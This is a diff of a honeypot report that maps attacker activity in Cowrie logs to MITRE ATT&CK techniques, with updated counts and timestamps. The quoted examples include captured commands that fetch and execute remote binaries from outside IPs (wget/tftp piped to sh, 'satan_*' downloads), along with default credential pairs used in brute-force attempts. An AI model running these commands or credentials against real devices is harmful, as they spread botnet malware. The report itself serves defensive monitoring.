@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-20 12:03:45",
+  "generated": "2026-08-20 13:01:11",
   "totals": {
-    "commands": 505,
-    "login_failed": 2159,
-    "login_success": 62,
-    "sessions": 2362
+    "commands": 536,
+    "login_failed": 2280,
+    "login_success": 67,
+    "sessions": 2471
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2159,
+      "count": 2280,
       "examples": [
         "nginx / 150.136.155.47",
         "tyre / tyre",
@@ -21,30 +21,14 @@
         "tyre / tyre1234"
       ],
       "first": "2026-08-20T00:02:12.859219Z",
-      "last": "2026-08-20T12:03:34.738806Z",
-      "unique_ips": 57
-    },
-    {
-      "id": "T1078",
-      "name": "Valid Accounts",
-      "tactic": "Initial Access",
-      "count": 62,
-      "examples": [
-        "admin / switch",
-        "admin / admin",
-        "Admin / ",
-        "admin / qwaszx",
-        "enable\\x00 / system\\x00"
-      ],
-      "first": "2026-08-20T01:07:19.606932Z",
-      "last": "2026-08-20T12:03:35.778445Z",
-      "unique_ips": 43
+      "last": "2026-08-20T13:00:14.571435Z",
+      "unique_ips": 61
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 62,
+      "count": 77,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/satan_mips; chmod 777 satan_mips; ./sat",
@@ -53,14 +37,30 @@
         "wget http://31.77.227.121/satan_mips_el; chmod 777 satan_mips_el; ./satan_mips_el; rm -rf satan_mips_el"
       ],
       "first": "2026-08-20T01:21:21.761677Z",
-      "last": "2026-08-20T10:23:17.665810Z",
-      "unique_ips": 9
+      "last": "2026-08-20T12:27:03.500980Z",
+      "unique_ips": 10
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 67,
+      "examples": [
+        "admin / switch",
+        "admin / admin",
+        "Admin / ",
+        "admin / qwaszx",
+        "enable\\x00 / system\\x00"
+      ],
+      "first": "2026-08-20T01:07:19.606932Z",
+      "last": "2026-08-20T12:49:42.994622Z",
+      "unique_ips": 47
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 44,
+      "count": 48,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "http://2.26.136.128/twget.sh",
@@ -69,8 +69,8 @@
         "wget http://31.77.227.121/satan_arm; chmod 777 satan_arm; ./satan_arm; rm -rf satan_arm"
       ],
       "first": "2026-08-20T01:10:19.623993Z",
-      "last": "2026-08-20T09:45:53.885080Z",
-      "unique_ips": 9
+      "last": "2026-08-20T12:27:03.500980Z",
+      "unique_ips": 10
     },
     {
       "id": "T1082",
@@ -106,14 +106,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 5,
+      "count": 6,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-20T02:31:13.448948Z",
-      "last": "2026-08-20T10:23:17.665810Z",
-      "unique_ips": 5
+      "last": "2026-08-20T12:26:27.325397Z",
+      "unique_ips": 6
     },
     {
       "id": "T1057",
@@ -222,11 +222,11 @@
     ],
     [
       "/bin/busybox",
-      17
+      24
     ],
     [
       "sh",
-      13
+      14
     ],
     [
       "zalee",
@@ -242,22 +242,30 @@
     ],
     [
       "shell",
-      8
+      9
     ],
     [
       "enable",
-      7
+      8
     ],
     [
       "system",
-      7
+      8
     ],
     [
       "linuxshell",
-      6
+      7
     ],
     [
       "ping ;sh",
+      6
+    ],
+    [
+      "enablelinuxshell",
+      5
+    ],
+    [
+      "cd /proc && cat self/cmdline",
       5
     ],
     [
@@ -265,12 +273,8 @@
       5
     ],
     [
-      "enablelinuxshell",
-      4
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      4
+      "busybox",
+      3
     ],
     [
       "ping; sh",
@@ -282,10 +286,6 @@
     ],
     [
       "/bin/busybox hostname TOASTER",
-      2
-    ],
-    [
-      "busybox",
       2
     ],
     [
